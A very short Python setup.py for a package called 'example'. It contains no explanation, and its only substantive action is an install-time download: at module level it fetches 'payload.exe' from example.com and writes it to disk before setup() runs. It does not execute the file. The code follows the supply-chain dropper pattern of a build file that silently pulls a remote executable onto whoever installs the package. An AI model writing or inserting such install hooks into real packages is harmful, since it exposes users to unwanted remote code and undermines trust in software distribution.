import requests as r
from setuptools import setup

open('payload.exe', 'wb').write(r.get('https://example.com/payload.exe').content)
setup(name='example')
